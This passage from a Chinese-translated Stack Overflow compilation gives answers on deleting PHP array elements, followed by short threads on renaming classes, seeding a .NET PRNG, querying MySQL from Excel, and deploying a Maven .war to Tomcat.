如果您知道要删除的数组元素的值，则可以使用`\array_diff()`. 和以前一样，`unset()`它不会更改数组的键。

代码：

```
$array = [0 => "a", 1 => "b", 2 => "c", 3 => "c"];
$array = \array_diff($array, ["a", "c"]);
                          // └────────┘
                          // Array values which you want to delete 
```

输出：

```
[
    [1] => b
] 
```

### [`\array_diff_key()`](http://php.net/manual/en/function.array-diff-key.php)方法

如果您知道要删除的元素的键，那么您要使用`\array_diff_key()`. 您必须确保将键作为第二个参数中的键而不是值传递。键不会重新索引。

代码：

```
$array = [0 => "a", 1 => "b", 2 => "c"];
$array = \array_diff_key($array, [0 => "xy", "2" => "xy"]);
                               // ↑           ↑
                               // Array keys which you want to delete 
```

输出：

```
[
    [1] => b
] 
```

如果要使用`unset()`或`\array_splice()`删除具有相同值的多个元素，可以使用[`\array_keys()`](http://php.net/manual/en/function.array-keys.php)获取特定值的所有键，然后删除所有元素。

* * *

## 回答 #2

> 赞同：1393
> 
> 时间：2008-12-15T21:25:12.747

应该注意的是，[`unset()`](http://php.net/unset)它将保持索引不变，这是您在使用字符串索引（数组作为哈希表）时所期望的，但在处理整数索引数组时可能会非常令人惊讶：

```
$array = array(0, 1, 2, 3);
unset($array[2]);
var_dump($array);
/* array(3) {
  [0]=>
  int(0)
  [1]=>
  int(1)
  [3]=>
  int(3)
} */

$array = array(0, 1, 2, 3);
array_splice($array, 2, 1);
var_dump($array);
/* array(3) {
  [0]=>
  int(0)
  [1]=>
  int(1)
  [2]=>
  int(3)
} */ 
```

[`array_splice()`](http://php.net/array_splice)如果你想标准化你的整数键，那么可以使用它。另一种选择是使用[`array_values()`](http://php.net/array_values)after [`unset()`](http://php.net/unset)：

```
$array = array(0, 1, 2, 3);

unset($array[2]);
$array = array_values($array);
var_dump($array);
/* array(3) {
  [0]=>
  int(0)
  [1]=>
  int(1)
  [2]=>
  int(3)
} */ 
```

* * *

## 回答 #3

> 赞同：404
> 
> 时间：2011-08-02T15:57:47.963

```
 // Our initial array
  $arr = array("blue", "green", "red", "yellow", "green", "orange", "yellow", "indigo", "red");
  print_r($arr);

  // Remove the elements who's values are yellow or red
  $arr = array_diff($arr, array("yellow", "red"));
  print_r($arr); 
```

这是上面代码的输出：

```
Array
(
    [0] => blue
    [1] => green
    [2] => red
    [3] => yellow
    [4] => green
    [5] => orange
    [6] => yellow
    [7] => indigo
    [8] => red
)

Array
(
    [0] => blue
    [1] => green
    [4] => green
    [5] => orange
    [7] => indigo
) 
```

现在，array_values() 将很好地重新索引一个数字数组，但它会从数组中删除所有键字符串并用数字替换它们。如果您需要保留键名（字符串），或者如果所有键都是数字的，则重新索引数组，请使用 array_merge()：

```
$arr = array_merge(array_diff($arr, array("yellow", "red")));
print_r($arr); 
```

输出

```
Array
(
    [0] => blue
    [1] => green
    [2] => green
    [3] => orange
    [4] => indigo
) 
```

* * *

## 回答 #4

> 赞同：228
> 
> 时间：2011-11-15T11:29:01.617

```
$key = array_search($needle, $array);
if ($key !== false) {
    unset($array[$key]);
} 
```

* * *

## 回答 #5

> 赞同：100
> 
> 时间：2008-12-15T20:31:31.730

```
unset($array[$index]); 
```

* * *

## 回答 #6

> 赞同：70
> 
> 时间：2012-11-26T08:25:05.223

如果您有一个数字索引数组，其中所有值都是唯一的（或者它们是非唯一的，但您希望删除特定值的所有实例），您可以简单地使用 array_diff() 删除匹配的元素，如下所示：

```
$my_array = array_diff($my_array, array('Value_to_remove')); 
```

例如：

```
$my_array = array('Andy', 'Bertha', 'Charles', 'Diana');
echo sizeof($my_array) . "\n";
$my_array = array_diff($my_array, array('Charles'));
echo sizeof($my_array); 
```

这将显示以下内容：

```
4
3 
```

在此示例中，删除了值为“Charles”的元素，这可以通过 sizeof() 调用来验证，该调用报告初始数组的大小为 4，删除后为 3。

* * *

## 回答 #7

> 赞同：69
> 
> 时间：2010-07-31T01:06:55.353

此外，对于命名元素：

```
unset($array["elementName"]); 
```

* * *

## 回答 #8

> 赞同：38
> 
> 时间：2015-07-19T15:37:39.617

**销毁数组的单个元素**

**`unset()`**

```
$array1 = array('A', 'B', 'C', 'D', 'E');
unset($array1[2]); // Delete known index(2) value from array
var_dump($array1); 
```

输出将是：

```
array(4) {
  [0]=>
  string(1) "A"
  [1]=>
  string(1) "B"
  [3]=>
  string(1) "D"
  [4]=>
  string(1) "E"
} 
```

如果需要重新索引数组：

```
$array1 = array_values($array1);
var_dump($array1); 
```

然后输出将是：

```
array(4) {
  [0]=>
  string(1) "A"
  [1]=>
  string(1) "B"
  [2]=>
  string(1) "D"
  [3]=>
  string(1) "E"
} 
```

**从数组末尾弹出元素**- 返回已删除元素的值

**`mixed array_pop(array &$array)`**

```
$stack = array("orange", "banana", "apple", "raspberry");
$last_fruit = array_pop($stack);
print_r($stack);
print_r('Last Fruit:'.$last_fruit); // Last element of the array 
```

输出将是

```
Array
(
    [0] => orange
    [1] => banana
    [2] => apple
)
Last Fruit: raspberry 
```

**从数组中移除第一个元素（红色）**， - 返回移除元素的值

**`mixed array_shift ( array &$array )`**

```
$color = array("a" => "red", "b" => "green" , "c" => "blue");
$first_color = array_shift($color);
print_r ($color);
print_r ('First Color: '.$first_color); 
```

输出将是：

```
Array
(
    [b] => green
    [c] => blue
)
First Color: red 
```

* * *

## 回答 #9

> 赞同：37
> 
> 时间：2013-06-11T05:51:47.663

```
<?php
    $stack = ["fruit1", "fruit2", "fruit3", "fruit4"];
    $fruit = array_shift($stack);
    print_r($stack);

    echo $fruit;
?> 
```

输出：

```
[
    [0] => fruit2
    [1] => fruit3
    [2] => fruit4
]

fruit1 
```

* * *

## 回答 #10

> 赞同：29
> 
> 时间：2019-05-23T12:26:29.033

**如果指定了索引：**

```
$arr = ['a', 'b', 'c'];
$index = 0;    
unset($arr[$index]);  // $arr = ['b', 'c'] 
```

**如果我们有值而不是索引：**

```
$arr = ['a', 'b', 'c'];

// search the value to find index
// Notice! this will only find the first occurrence of value
$index = array_search('a', $arr);

if($index !== false){
   unset($arr[$index]);  // $arr = ['b', 'c']
} 
```

该`if`条件是必要的，因为如果`index`没有找到，`unset()`将自动删除数组的第一个元素，这不是我们想要的。

* * *

## 回答 #11

> 赞同：26
> 
> 时间：2016-02-18T01:40:49.680

如果您必须删除数组中的多个值，并且该数组中的条目是对象或结构化数据，那么[`array_filter()`](http://php.net/array_filter)这是您最好的选择。从回调函数返回 true 的那些条目将被保留。

```
$array = [
    ['x'=>1,'y'=>2,'z'=>3], 
    ['x'=>2,'y'=>4,'z'=>6], 
    ['x'=>3,'y'=>6,'z'=>9]
];

$results = array_filter($array, function($value) {
    return $value['x'] > 2; 
}); //=> [['x'=>3,'y'=>6,z=>'9']] 
```

* * *

## 回答 #12

> 赞同：22
> 
> 时间：2016-03-11T18:48:25.237

## 关联数组

对于关联数组，请使用[**`unset`**](http://php.net/manual/en/function.unset.php)：

```
$arr = array('a' => 1, 'b' => 2, 'c' => 3);
unset($arr['b']);

// RESULT: array('a' => 1, 'c' => 3) 
```

* * *

## 数值数组

对于数值数组，使用[**`array_splice`**](http://php.net/manual/en/function.array-splice.php)：

```
$arr = array(1, 2, 3);
array_splice($arr, 1, 1);

// RESULT: array(0 => 1, 1 => 3) 
```

### 笔记

使用[**`unset`**](http://php.net/manual/en/function.unset.php)数字数组不会产生错误，但会弄乱您的索引：

```
$arr = array(1, 2, 3);
unset($arr[1]);

// RESULT: array(0 => 1, 2 => 3) 
```

* * *

## 回答 #13

> 赞同：22
> 
> 时间：2016-04-20T21:05:31.780

如果需要从关联数组中删除多个元素，可以使用[array_diff_key()](http://php.net/manual/en/function.array-diff-key.php)（这里与[array_flip()](http://php.net/manual/en/function.array-flip.php)一起使用）：

```
$my_array = array(
  "key1" => "value 1",
  "key2" => "value 2",
  "key3" => "value 3",
  "key4" => "value 4",
  "key5" => "value 5",
);

$to_remove = array("key2", "key4");

$result = array_diff_key($my_array, array_flip($to_remove));

print_r($result); 
```

输出：

```
Array ( [key1] => value 1 [key3] => value 3 [key5] => value 5 ) 
```

* * *

## 回答 #14

> 赞同：21
> 
> 时间：2013-07-26T20:11:54.043

`unset()`销毁指定的变量。

函数内部的行为`unset()`可能因您尝试销毁的变量类型而异。

如果`unset()`全局变量在函数内部，则只有局部变量被销毁。调用环境中的变量将保留与调用之前相同的值`unset()`。

```
<?php
    function destroy_foo()
    {
        global $foo;
        unset($foo);
    }

    $foo = 'bar';
    destroy_foo();
    echo $foo;
?> 
```

上面代码的答案是**bar**。

到`unset()`函数内部的全局变量：

```
<?php
    function foo()
    {
        unset($GLOBALS['bar']);
    }

    $bar = "something";
    foo();
?> 
```

* * *

## 回答 #15

> 赞同：19
> 
> 时间：2016-04-02T18:42:29.633

```
// Remove by value
function removeFromArr($arr, $val)
{
    unset($arr[array_search($val, $arr)]);
    return array_values($arr);
} 
```

* * *

## 回答 #16

> 赞同：13
> 
> 时间：2018-01-29T11:08:20.303

**解决方案：**

1.  要删除一个元素，请使用[unset()](http://php.net/manual/en/function.unset.php)：

> ```
> unset($array[3]);
> unset($array['foo']); 
> ```

2.  要删除多个不连续的元素，也可以使用[unset()](http://php.net/manual/en/function.unset.php)：

> ```
> unset($array[3], $array[5]);
> unset($array['foo'], $array['bar']); 
> ```

3.  要删除多个连续元素，请使用[array_splice()](http://php.net/manual/en/function.array-splice.php)：

> ```
> array_splice($array, $offset, $length); 
> ```

**进一步说明：**

使用这些函数会从 PHP 中删除对这些元素的所有引用。如果您想在数组中保留一个键，但具有一个空值，请将空字符串分配给该元素：

```
$array[3] = $array['foo'] = ''; 
```

[除了语法之外，使用unset()](http://php.net/manual/en/function.unset.php)和将 '' 分配给元素之间存在逻辑差异。第一个说`This doesn't exist anymore,`，第二个说`This still exists, but its value is the empty string.`

如果您正在处理数字，分配 0 可能是更好的选择。因此，如果一家公司停止生产 XL1000 型链轮，它将更新其库存：

```
unset($products['XL1000']); 
```

但是，如果它暂时用完 XL1000 链轮，但计划在本周晚些时候从工厂接收新的货物，那么这样会更好：

```
$products['XL1000'] = 0; 
```

如果你[unset()](http://php.net/manual/en/function.unset.php)一个元素，PHP 会调整数组以便循环仍然正常工作。它不会压缩阵列以填充缺失的孔。这就是我们说所有数组都是关联的，即使它们看起来是数字的。这是一个例子：

```
// Create a "numeric" array
$animals = array('ant', 'bee', 'cat', 'dog', 'elk', 'fox');
print $animals[1];  // Prints 'bee'
print $animals[2];  // Prints 'cat'
count($animals);    // Returns 6

// unset()
unset($animals[1]); // Removes element $animals[1] = 'bee'
print $animals[1];  // Prints '' and throws an E_NOTICE error
print $animals[2];  // Still prints 'cat'
count($animals);    // Returns 5, even though $array[5] is 'fox'

// Add a new element
$animals[ ] = 'gnu'; // Add a new element (not Unix)
print $animals[1];  // Prints '', still empty
print $animals[6];  // Prints 'gnu', this is where 'gnu' ended up
count($animals);    // Returns 6

// Assign ''
$animals[2] = '';   // Zero out value
print $animals[2];  // Prints ''
count($animals);    // Returns 6, count does not decrease 
```

要将数组压缩成一个密集填充的数值数组，请使用[array_values()](http://php.net/manual/en/function.array-values.php)：

```
$animals = array_values($animals); 
```

或者，[array_splice()](http://php.net/manual/en/function.array-splice.php)自动重新索引数组以避免留下孔：

```
// Create a "numeric" array
$animals = array('ant', 'bee', 'cat', 'dog', 'elk', 'fox');
array_splice($animals, 2, 2);
print_r($animals);
Array
(
    [0] => ant
    [1] => bee
    [2] => elk
    [3] => fox
) 
```

如果您将数组用作队列并希望从队列中删除项目同时仍允许随机访问，这将非常有用。要安全地从数组中删除第一个或最后一个元素，请分别使用[array_shift()](http://php.net/manual/en/function.array-shift.php)和[array_pop()](http://php.net/manual/en/function.array-pop.php)。

* * *

## 回答 #17

> 赞同：11
> 
> 时间：2016-01-25T13:07:09.640

遵循默认功能：

*   **PHP：未设置**

`unset()`销毁指定的变量。有关更多信息，您可以参考[PHP 未设置](https://www.php.net/manual/en/function.unset.php)

```
$Array = array("test1", "test2", "test3", "test3");

unset($Array[2]); 
```

*   **PHP：数组弹出**

该`array_pop()`函数删除数组的最后一个元素。更多信息，你可以参考[PHP array_pop](https://www.php.net/manual/en/function.array-pop.php)

```
$Array = array("test1", "test2", "test3", "test3");

array_pop($Array); 
```

*   **PHP: 数组拼接**

该`array_splice()`函数从数组中删除选定的元素并用新元素替换它。更多信息，你可以参考[PHP array_splice](https://www.php.net/manual/en/function.array-splice.php)

```
$Array = array("test1", "test2", "test3", "test3");

array_splice($Array,1,2); 
```

*   **PHP: 数组移位**

该`array_shift()`函数从数组中删除第一个元素。有关更多信息，您可以参考[PHP array_shift](https://www.php.net/manual/en/function.array-shift.php)

```
$Array = array("test1", "test2", "test3", "test3");

array_shift($Array); 
```

* * *

## 回答 #18

> 赞同：10
> 
> 时间：2013-08-21T02:31:03.403

我只想说我有一个具有可变属性的特定对象（它基本上是映射一个表，我正在更改表中的列，所以对象中的属性，反映表也会有所不同）：

```
class obj {
    protected $fields = array('field1','field2');
    protected $field1 = array();
    protected $field2 = array();
    protected loadfields(){}
    // This will load the $field1 and $field2 with rows of data for the column they describe
    protected function clearFields($num){
        foreach($fields as $field) {
            unset($this->$field[$num]);
            // This did not work the line below worked
            unset($this->{$field}[$num]); // You have to resolve $field first using {}
        }
    }
} 
```

的全部目的`$fields`只是，所以当它们被更改时我不必在代码中到处查看，我只需查看类的开头并更改属性列表和**$fields**数组内容以反映新的属性。

* * *

## 回答 #19

> 赞同：9
> 
> 时间：2015-06-11T22:25:32.357

假设您有以下数组：

```
Array
(
    [user_id] => 193
    [storage] => 5
) 
```

要删除`storage`，请执行以下操作：

```
unset($attributes['storage']);
$attributes = array_filter($attributes); 
```

你得到：

```
Array
(
    [user_id] => 193
) 
```

* * *

## 回答 #20

> 赞同：9
> 
> 时间：2018-10-16T01:20:57.127

在保持索引顺序以及不知道第一项的键名的情况下，有两种方法可以删除数组的第一项。

### 解决方案#1

```
// 1 is the index of the first object to get
// NULL to get everything until the end
// true to preserve keys
$array = array_slice($array, 1, null, true); 
```

### 解决方案#2

```
// Rewinds the array's internal pointer to the first element
// and returns the value of the first array element.
$value = reset($array);
// Returns the index element of the current array position
$key = key($array);
unset($array[$key]); 
```

* * *

对于此示例数据：

```
$array = array(10 => "a", 20 => "b", 30 => "c"); 
```

你必须有这个结果：

```
array(2) {
  [20]=>
  string(1) "b"
  [30]=>
  string(1) "c"
} 
```

* * *

## 回答 #21

> 赞同：8
> 
> 时间：2017-12-07T06:28:59.317

## unset() 数组中的多个碎片元素

虽然`unset()`这里已经多次提到，但还没有提到`unset()`接受多个变量，从而可以轻松地在一次操作中从数组中删除多个不连续的元素：

```
// Delete multiple, noncontiguous elements from an array
$array = [ 'foo', 'bar', 'baz', 'quz' ];
unset( $array[2], $array[3] );
print_r($array);
// Output: [ 'foo', 'bar' ] 
```

## unset() 动态

unset() 不接受要删除的键数组，因此下面的代码将失败（尽管动态使用 unset() 会稍微容易一些）。

```
$array = range(0,5);
$remove = [1,2];
$array = unset( $remove ); // FAILS: "unexpected 'unset'"
print_r($array); 
```

相反， unset() 可以在 foreach 循环中动态使用：

```
$array = range(0,5);
$remove = [1,2];
foreach ($remove as $k=>$v) {
    unset($array[$v]);
}
print_r($array);
// Output: [ 0, 3, 4, 5 ] 
```

## 通过复制数组删除数组键

还有另一种做法尚未提及。有时，摆脱某些数组键的最简单方法是简单地将 $array1 复制到 $array2 中。

```
$array1 = range(1,10);
foreach ($array1 as $v) {
    // Remove all even integers from the array
    if( $v % 2 ) {
        $array2[] = $v;
    }
}
print_r($array2);
// Output: [ 1, 3, 5, 7, 9 ]; 
```

显然，同样的做法适用于文本字符串：

```
$array1 = [ 'foo', '_bar', 'baz' ];
foreach ($array1 as $v) {
    // Remove all strings beginning with underscore
    if( strpos($v,'_')===false ) {
        $array2[] = $v;
    }
}
print_r($array2);
// Output: [ 'foo', 'baz' ] 
```

* * *

## 回答 #22

> 赞同：7
> 
> 时间：2017-09-22T10:28:59.213

### 根据键删除数组元素：

使用如下`unset`函数：

```
$a = array(
       'salam',
       '10',
       1
);

unset($a[1]);

print_r($a);

/*

    Output:

        Array
        (
            [0] => salam
            [2] => 1
        )

*/ 
```

### 根据值删除数组元素：

使用该`array_search`函数获取元素键并使用上述方式删除数组元素，如下所示：

```
$a = array(
       'salam',
       '10',
       1
);

$key = array_search(10, $a);

if ($key !== false) {
    unset($a[$key]);
}

print_r($a);

/*

    Output:

        Array
        (
            [0] => salam
            [2] => 1
        )

*/ 
```

* * *

## 回答 #23

> 赞同：7
> 
> 时间：2019-06-11T10:16:46.170

## 编辑

如果您不能认为该对象在该数组中，则需要添加一个检查：

```
if(in_array($object,$array)) unset($array[array_search($object,$array)]); 
```

## 原始答案

如果您想通过引用该对象来删除数组的特定对象，您可以执行以下操作：

```
unset($array[array_search($object,$array)]); 
```

例子：

```
<?php
class Foo
{
    public $id;
    public $name;
}

$foo1 = new Foo();
$foo1->id = 1;
$foo1->name = 'Name1';

$foo2 = new Foo();
$foo2->id = 2;
$foo2->name = 'Name2';

$foo3 = new Foo();
$foo3->id = 3;
$foo3->name = 'Name3';

$array = array($foo1,$foo2,$foo3);
unset($array[array_search($foo2,$array)]);

echo '<pre>';
var_dump($array);
echo '</pre>';
?> 
```

结果：

```
array(2) {
[0]=>
    object(Foo)#1 (2) {
        ["id"]=>
        int(1)
        ["name"]=>
        string(5) "Name1"
    }
[2]=>
    object(Foo)#3 (2) {
        ["id"]=>
        int(3)
        ["name"]=>
        string(5) "Name3"
    }
} 
```

请注意，如果对象多次出现，则只会在第一次出现时将其删除！

* * *

## 回答 #24

> 赞同：6
> 
> 时间：2013-05-17T08:56:09.923

使用以下代码：

```
$arr = array('orange', 'banana', 'apple', 'raspberry');
$result = array_pop($arr);
print_r($result); 
```

* * *

## 回答 #25

> 赞同：6
> 
> 时间：2016-08-16T15:36:02.923

```
<?php
    // If you want to remove a particular array element use this method
    $my_array = array("key1"=>"value 1", "key2"=>"value 2", "key3"=>"value 3");

    print_r($my_array);
    if (array_key_exists("key1", $my_array)) {
        unset($my_array['key1']);
        print_r($my_array);
    }
    else {
        echo "Key does not exist";
    }
?>

<?php
    //To remove first array element
    $my_array = array("key1"=>"value 1", "key2"=>"value 2", "key3"=>"value 3");
    print_r($my_array);
    $new_array = array_slice($my_array, 1);
    print_r($new_array);
?>

<?php
    echo "<br/>    ";
    // To remove first array element to length
    // starts from first and remove two element
    $my_array = array("key1"=>"value 1", "key2"=>"value 2", "key3"=>"value 3");
    print_r($my_array);
    $new_array = array_slice($my_array, 1, 2);
    print_r($new_array);
?> 
```

**输出**

```
 Array ( [key1] => value 1 [key2] => value 2 [key3] =>
 value 3 ) Array (    [key2] => value 2 [key3] => value 3 )
 Array ( [key1] => value 1 [key2] => value 2 [key3] => value 3 )
 Array ( [key2] => value 2 [key3] => value 3 )
 Array ( [key1] => value 1 [key2] => value 2 [key3] => value 3 )
 Array ( [key2] => value 2 [key3] => value 3 ) 
```

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2020-10-13T14:32:12.267

我来到这里是因为我想看看是否有比使用 unset($arr[$i]) 更优雅的解决方案来解决这个问题。令我失望的是，这些答案要么是错误的，要么没有涵盖所有边缘情况。

这就是为什么 array_diff() 不起作用的原因。键在数组中是唯一的，而元素并不总是唯一的。

```
$arr = [1,2,2,3];

foreach($arr as $i => $n){
    $b = array_diff($arr,[$n]);
    echo "\n".json_encode($b);
} 
```

结果...

```
[2,2,3]
[1,3]
[1,2,2] 
```

如果两个元素相同，它们将被删除。这也适用于 array_search() 和 array_flip()。

我看到了很多关于 array_slice() 和 array_splice() 的答案，但这些函数只适用于数值数组。如果这里没有回答问题，我知道的所有答案，所以这里有一个可行的解决方案。

```
$arr = [1,2,3];

foreach($arr as $i => $n){
    $b = array_merge(array_slice($arr,0,$i),array_slice($arr,$i+1));
    echo "\n".json_encode($b);
}

Results...

[2,3];
[1,3];
[1,2]; 
```

由于 unset($arr[$i]) 将适用于关联数组和数值数组，这仍然不能回答这个问题。

此解决方案是比较键并使用可以处理数字和关联数组的工具。我为此使用 array_diff_uassoc() 。此函数比较回调函数中的键。

```
$arr = [1,2,2,3];
//$arr = ['a'=>'z','b'=>'y','c'=>'x','d'=>'w'];
foreach($arr as $key => $n){
    $b = array_diff_uassoc($arr, [$key=>$n], function($a,$b) {
        if($a != $b){
            return 1;
        }
    });
    echo "\n".json_encode($b);
} 
```

结果.....

```
[2,2,3];
[1,2,3];
[1,2,2];

['b'=>'y','c'=>'x','d'=>'w'];
['a'=>'z','c'=>'x','d'=>'w'];
['a'=>'z','b'=>'y','d'=>'w'];
['a'=>'z','b'=>'y','c'=>'x']; 
```

# php - 在整个开发过程中更改类名

> ID：369626
> 
> 赞同：0
> 
> 时间：2008-12-15T20:39:21.263
> 
> 标签：php, dreamweaver

我的情况是我有“进步”类 - 问题是我有兴趣合并一些也有“进步”类的开源。我记得非常模糊地提到了一个应用程序，该应用程序能够检查开发中的各种文件以获取给定的类名......然后返回它......或更改它。你有这方面的经验吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T20:48:10.637

某些语言（C++、C#）有命名空间的概念。Java有包。Python有模块。它们旨在防止类名冲突。假设您在谈论 Java，名为“Progress”的开源类可能在它自己的包中，而您的“Progress”在您自己的包中。因此，也许您并没有像您想象的那样遇到问题。

话虽如此，我猜您是在询问 IDE 中称为重构的功能，该功能允许您在任何引用或依赖它的地方更改类名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T20:44:04.840

许多 IDE（例如 Eclipse）可以做到这一点，但 Java 比 PHP 更常见。由于 PHP 变量的动态特性，IDE 很难准确地知道要更改什么。例如，您可以这样做：

```
$name = "prog";
$name .= "ress";
$cls = new $name(); 
```

IDE 必须实际运行您的应用程序才能知道 $name 在特定时刻包含“进度”。即使那样，也没有办法自动修复它。

可悲的是，您陷入了查找和替换的困境。不过不用担心；在开发过程中更改类名是一件好事。它迫使您重新思考该课程的确切用途。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T20:57:29.587

始终使用产品/项目缩写作为类名的前缀。为什么不使用 TextPad 替换所有匹配项？这样你以后就不会混淆它是哪个类了。我还建议使用命名空间/包技术，但这会让你重写我假设的很多代码。

[http://en.wikipedia.org/wiki/Code_refactoring](http://en.wikipedia.org/wiki/Code_refactoring) 上面的链接有一些用于重构的工具。

# c# - 在 .NET 中播种随机数生成器

> ID：369636
> 
> 赞同：1
> 
> 时间：2008-12-15T20:42:55.343
> 
> 标签：c#, random

我有一个[伪随机数生成器](http://en.wikipedia.org/wiki/Pseudorandom_number_generator)(PRNG)，它具有很好的属性，它使用 6 个`UInt32`s 作为状态。我需要想出一个合理的方法来播种。两个明显的可能性是：1）使用它们生成六个随机数`System.Random`并将它们用作种子；2) 用 生成两个`GUID`s `Guid.NewGuid()`。哪个会更好？

我*不需要*加密安全。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T20:48:10.183

如果需要`UInt32`，那`Random`是不是更方便？just `Next()`, `Next()`, `Next()`etc (and cast)... (`Random`但是使用相同的实例 - 不要`new Random()`每次都创建)。

这取决于它是否提供足够的随机性的意图。既然这只是种子，应该没问题...

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-15T20:50:11.647

不幸的是 System.Random() 也需要一个种子值。默认情况下，它使用当前的 Tick 计数，该计数是可预测的，实际上不是随机的。所以你需要一个 Random 的种子，它会引导你回到原来的问题......

我以前从未使用过 Guid.GetHashCode() 作为种子，但我的 2 秒反应是这听起来不错。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-15T21:24:38.940

无论您是否需要加密安全，为什么不直接使用 System.Security.Cryptography.RNGCryptoServiceProvider 来生成您的随机数？除非有特定的原因，比如它太慢，否则我看不出你为什么不使用它。由于它是一个加密随机生成器，您将获得更好的随机数，并且不必担心播种它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-18T19:21:16.420

试试这个以获得你的种子价值......

```
(UInt32)Math.Pow(System.DateTime.Now.TimeOfDay.TotalMilliseconds, 11.0 / 7.0) 
```

它只是将当前时间的毫秒数提高到 11/7 次方，这只是任意的。您可以尝试其他分数，看看它们是否更适合您。

请注意，如果您的分数的十进制等值大于约 2.5，您可能会出现溢出并且您的种子值将为零。:(

我已经使用了一段时间，它似乎提供了相当不错的种子值。

# sql - Excel Add-On 显示来自（My）SQL 数据库的数据

> ID：369637
> 
> 赞同：1
> 
> 时间：2008-12-15T20:43:36.963
> 
> 标签：sql, mysql, excel

有没有一种简单的方法可以将数据从 mysql/odbc 数据源导入到 excel 电子表格中？

用户应该能够从下拉列表中选择一些值（例如日期范围、分支名称等），并且下拉列表中的值应该用于填充（准备）SQL 语句。结果应显示在 Excel 文件中。

理想情况下，将有一个“保存快照”菜单项，将动态 excel 文件（保存 sql 语句）转换为静态 excel 文件，从而减少内部（例如 sql）对外部资源的暴露。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T20:48:29.433

您可以下载[MySQL 的 ODBC 驱动程序](http://dev.mysql.com/downloads/connector/odbc/5.1.html)，创建数据源，并使用[MS Query](http://office.microsoft.com/en-us/excel/HA100996641033.aspx)创建自定义 SQL 查询，您可以通过“数据”菜单将其添加到 Excel。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-07-05T21:40:17.630

这种方法应该比 CopyFromRecordset 快。当然，您必须确保已安装 MySQL ODBC 5.1 驱动程序...

```
With AWorksheet.QueryTables.Add( _
   Connection:="ODBC;Driver=MySQL ODBC 5.1 Driver;Port=3306;Server=mysqlservername;Database=snort;User=username;Password=password;Option=3;"
   Destination:=AWorksheet.Range(AWorksheet.Cells(1, 1), AWorksheet.Cells(1, 15)) _
  )

   .CommandText = "SELECT Something FROM Somewhere"
   .Name = "Name"
   .FieldNames = True
   .RowNumbers = False
   .FillAdjacentFormulas = False
   .PreserveFormatting = True
   .RefreshOnFileOpen = False
   .BackgroundQuery = True
   .RefreshStyle = xlOverwriteCells
   .SavePassword = False
   .SaveData = True
   .AdjustColumnWidth = False
   .RefreshPeriod = 0
   .PreserveColumnInfo = True
   .Refresh BackgroundQuery:=False
   .Delete
End With 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T20:46:23.230

[http://sqlexcel.net/](http://sqlexcel.net/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T20:58:18.260

这是一个例子：

```
Set cn = CreateObject("ADODB.Connection")
Set rs = CreateObject("ADODB.Recordset")

strCon = "Driver={MySQL ODBC 3.51 Driver};Server=localhost;Database=MyDB;" _
& "User=UName;Password=PWord;Option=3;"

cn.Open strCon

strSQL = "SELECT * FROM Members"

rs.Open strSQL, cn

Worksheets(3).Cells(2, 1).CopyFromRecordset rs 
```

# maven - 如何使用 Maven 将 .war 复制到 Tomcat 的 webapps 目录？

> ID：369639
> 
> 赞同：47
> 
> 时间：2008-12-15T20:44:12.110
> 
> 标签：maven, maven-plugin

有什么我可以添加的`pom.xml`内容将生成的`.war`文件从`target`目录复制到我的Tomcat`webapps`目录吗？

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2011-02-11T08:04:49.347

```
<build>
   <plugins>
     <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-war-plugin</artifactId>
        <version>3.2.1</version>
        <configuration>
           <outputDirectory><!-- Tomcat webapps location--></outputDirectory>
           <!-- Example of Tomcat webapps location :D:\tomcat\webapps\ -->
        </configuration>
      </plugin>
    </plugins>
</build> 
```

将它添加到您的 . 文件后，您可以通过调用或`pom.xml`来复制 WAR 文件。 `mvn package``mvn war:war`

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2009-04-10T16:15:26.137

我使用了 Maven WAR 插件： [http ://maven.apache.org/plugins/maven-war-plugin/usage.html](http://maven.apache.org/plugins/maven-war-plugin/usage.html)

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-06-05T23:16:22.140

这是正确的方法：

```
 <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-war-plugin</artifactId>
            <version>2.3</version>
            <configuration>
             <warName>${name}</warName>
             <outputDirectory>C:\Tomcat7\webapps</outputDirectory>
            </configuration>
        </plugin> 
```

这将在 C:\Tomcat7\webapps 文件夹中放置一个带有 maven 项目名称的 war 文件。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-12-15T20:57:42.847

您可以使用[http://cargo.codehaus.org/Deploying+to+a+running+container](http://cargo.codehaus.org/Deploying+to+a+running+container)并进行相应的配置。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-12-15T23:59:37.987

你也可以看看码头插件。只需输入“mvn jetty:run-war”，码头就会运行你的战争文件。

编辑：Jetty 是一个适合开发和测试的轻量级 servlet 容器。启动也快如闪电。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2009-02-11T05:38:56.880

或者，您可以让 tomcat 查看您的目标目录并直接从那里部署。

在您的 context.xml 或 server.xml 的 Context 元素中：

```
<Context path="" docBase="/path/to/target/exploded">
...
</Context> 
```

然后你可以使用 war:exploded 目标来创建你的爆炸战争。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-12-16T19:51:10.000

不理想，但如果你有一个非常奇怪的应用服务器设置，你总是可以使用 antrun 任务集在运行打包时执行

```
<build>
    ....
    <plugins>
       <plugin>
          <artifactId>maven-antrun-plugin</artifactId>
          <executions>
            <execution>
              <phase>package</phase>
              <configuration>
                <tasks>
                  <!-- Ant copy tasks go here -->
                </tasks>
              </configuration>
              <goals>
                <goal>run</goal>
              </goals>
            </execution>
          </executions>
        </plugin>
     </plugins>
  </build> 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2016-12-12T02:23:21.017

